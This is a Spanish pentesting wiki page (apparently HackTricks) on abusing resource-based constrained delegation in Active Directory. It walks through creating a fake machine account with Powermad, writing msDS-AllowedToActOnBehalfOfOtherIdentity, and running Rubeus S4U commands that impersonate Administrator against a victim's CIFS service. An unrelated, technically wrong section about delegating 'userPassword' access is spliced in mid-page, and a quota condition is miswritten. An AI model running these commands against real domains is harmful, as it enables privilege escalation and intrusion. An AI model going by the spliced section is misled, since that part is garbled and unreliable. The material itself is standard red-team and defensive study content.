# Delegación restringida basada en recursos

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Conceptos básicos de la delegación restringida basada en recursos

Esto es similar a la [delegación restringida](constrained-delegation.md) básica, pero **en lugar de otorgar permisos a un objeto para que se haga pasar por cualquier usuario frente a un servicio**, la delegación restringida basada en recursos **establece en el objeto quién puede hacerse pasar por cualquier usuario frente a él**.

En este caso, el objeto restringido tendrá un atributo llamado _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ con el nombre del usuario que puede hacerse pasar por cualquier otro usuario frente a él.

Otra diferencia importante de esta delegación restringida con respecto a las otras delegaciones es que cualquier usuario con **permisos de escritura sobre una cuenta de máquina** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) puede establecer el _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (en las otras formas de delegación se necesitaban privilegios de administrador de dominio).

### Nuevos conceptos

En la delegación restringida se dijo que se necesitaba la marca **`TrustedToAuthForDelegation`** dentro del valor _userAccountControl_ del usuario para realizar un **S4U2Self**. Pero eso no es completamente cierto.\
La realidad es que incluso sin ese valor, se puede realizar un **S4U2Self** contra cualquier usuario si se es un **servicio** (tiene un SPN), pero si se **tiene `TrustedToAuthForDelegation`**, el TGS devuelto será **Forwardable** y si no se tiene esa marca, el TGS devuelto **no** será **Forwardable**.

Sin embargo, si el **TGS** utilizado en **S4U2Proxy** **NO es Forwardable**, intentar abusar de una **delegación restringida básica** no funcionará. Pero si se intenta explotar una **delegación restringida basada en recursos, funcionará** (esto no es una vulnerabilidad, es una característica, aparentemente).

### Estructura del ataque

> Si tienes **privilegios equivalentes a escritura** sobre una cuenta de **computadora**, puedes obtener **acceso privilegiado** en esa máquina.

Supongamos que el atacante ya tiene **privilegios equivalentes a escritura sobre la computadora víctima**.

1. El atacante **compromete** una cuenta que tiene un **SPN** o **crea uno** ("Servicio A"). Tenga en cuenta que **cualquier** _Usuario administrador_ sin ningún otro privilegio especial puede **crear** hasta 10 **objetos de computadora (**_**MachineAccountQuota**_**)** y establecerles un SPN. Por lo tanto, el atacante puede simplemente crear un objeto de computadora y establecer un SPN.
2. El atacante **abusa de su privilegio de ESCRITURA** sobre la computadora víctima (ServicioB) para configurar la **delegación restringida basada en recursos para permitir que ServiceA se haga pasar por cualquier usuario** frente a esa computadora víctima (ServicioB).
3. El atacante usa Rubeus para realizar un **ataque S4U completo** (S4U2Self y S4U2Proxy) desde Service A a Service B para un usuario **con acceso privilegiado a Service B**.
   1. S4U2Self (desde la cuenta comprometida/creada con SPN): Solicita un **TGS de Administrador para mí** (no Forwardable).
   2. S4U2Proxy: Usa el TGS **no Forwardable** del paso anterior para solicitar un **TGS** de **Administrador** a la **máquina víctima**.
   3. Incluso si se está utilizando un TGS no Forwardable, como se está explotando la delegación restringida basada en recursos, funcionará.
4. El atacante puede **pasar el ticket** e **hacerse pasar por** el usuario para obtener **acceso al ServicioB víctima**.

Para verificar la _**MachineAccountQuota**_ del dominio, se puede usar:
```
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Ataque

### Creando un objeto de equipo

Puedes crear un objeto de equipo dentro del dominio usando [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```csharp
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
# Delegación restringida basada en recursos

La delegación restringida basada en recursos es una técnica que permite a un usuario delegar sus permisos a otro usuario o servicio para que pueda acceder a un recurso específico en su nombre. Esto se logra mediante la configuración de la propiedad `msDS-AllowedToActOnBehalfOfOtherIdentity` en el objeto de usuario o servicio que se va a delegar.

## Escenario

Supongamos que tenemos un usuario llamado `user1` que tiene permisos para leer el atributo `userPassword` de cualquier objeto de usuario en el dominio. También tenemos un usuario llamado `user2` que no tiene permisos para leer el atributo `userPassword`, pero que necesita acceder a este atributo para realizar una tarea específica.

## Configuración

Para permitir que `user2` acceda al atributo `userPassword` de un usuario específico, podemos seguir los siguientes pasos:

1. Crear un usuario o servicio que represente la tarea que `user2` necesita realizar. Por ejemplo, podemos crear un usuario llamado `taskuser` que se utilizará para realizar la tarea.

2. Configurar la propiedad `msDS-AllowedToActOnBehalfOfOtherIdentity` en el objeto de `user1` para permitir que `taskuser` actúe en su nombre. Esto se puede hacer mediante el siguiente comando de PowerShell:

   ```
   Set-ADUser user1 -Add @{msDS-AllowedToActOnBehalfOfOtherIdentity="taskuser"}
   ```

3. Configurar la propiedad `msDS-AllowedToDelegateTo` en el objeto de `taskuser` para permitir que delegue los permisos de `user1` a otros objetos. Esto se puede hacer mediante el siguiente comando de PowerShell:

   ```
   Set-ADUser taskuser -Add @{msDS-AllowedToDelegateTo="user1"}
   ```

4. Configurar la propiedad `msDS-AllowedToActOnBehalfOfOtherIdentity` en el objeto de `user2` para permitir que `taskuser` actúe en su nombre. Esto se puede hacer mediante el siguiente comando de PowerShell:

   ```
   Set-ADUser user2 -Add @{msDS-AllowedToActOnBehalfOfOtherIdentity="taskuser"}
   ```

## Resultado

Después de realizar la configuración anterior, `user2` podrá acceder al atributo `userPassword` del usuario específico en nombre de `user1` utilizando las credenciales de `taskuser`. Esto se logra mediante la delegación restringida basada en recursos, que permite a `taskuser` actuar en nombre de `user1` solo para acceder al recurso específico necesario para realizar la tarea.
```bash
Get-DomainComputer SERVICEA #Check if created if you have powerview
```
### Configurando la Delegación Restringida Basada en Recursos

**Usando el módulo PowerShell de Active Directory**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Usando Powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Realizando un ataque S4U completo

En primer lugar, creamos el nuevo objeto de equipo con la contraseña `123456`, por lo que necesitamos el hash de esa contraseña:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Esto imprimirá los hashes RC4 y AES para esa cuenta.\
Ahora, el ataque puede ser realizado:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Puedes generar más tickets simplemente preguntando una vez usando el parámetro `/altservice` de Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Tenga en cuenta que los usuarios tienen un atributo llamado "**No se puede delegar**". Si un usuario tiene este atributo en Verdadero, no podrá suplantarlo. Esta propiedad se puede ver dentro de Bloodhound.
{% endhint %}

![](../../.gitbook/assets/B3.png)

### Accediendo

La última línea de comando realizará el **ataque completo S4U e inyectará el TGS** de Administrator al host víctima en **memoria**.\
En este ejemplo se solicitó un TGS para el servicio **CIFS** de Administrator, por lo que podrá acceder a **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abuso de diferentes tickets de servicio

Aprende sobre los [**tickets de servicio disponibles aquí**](silver-ticket.md#available-services).

## Errores de Kerberos

* **`KDC_ERR_ETYPE_NOTSUPP`**: Esto significa que Kerberos está configurado para no usar DES o RC4 y estás suministrando solo el hash RC4. Suministra a Rubeus al menos el hash AES256 (o simplemente suministra los hashes rc4, aes128 y aes256). Ejemplo: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Esto significa que la hora del equipo actual es diferente a la del DC y Kerberos no está funcionando correctamente.
* **`preauth_failed`**: Esto significa que el nombre de usuario + hashes dados no funcionan para iniciar sesión. Es posible que hayas olvidado poner el "$" dentro del nombre de usuario al generar los hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Esto puede significar:
  * El usuario que estás intentando suplantar no puede acceder al servicio deseado (porque no puedes suplantarlo o porque no tiene suficientes privilegios)
  * El servicio solicitado no existe (si solicitas un ticket para winrm pero winrm no está en ejecución)
  * El equipo falso creado ha perdido sus privilegios sobre el servidor vulnerable y necesitas devolverlos.

## Referencias

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
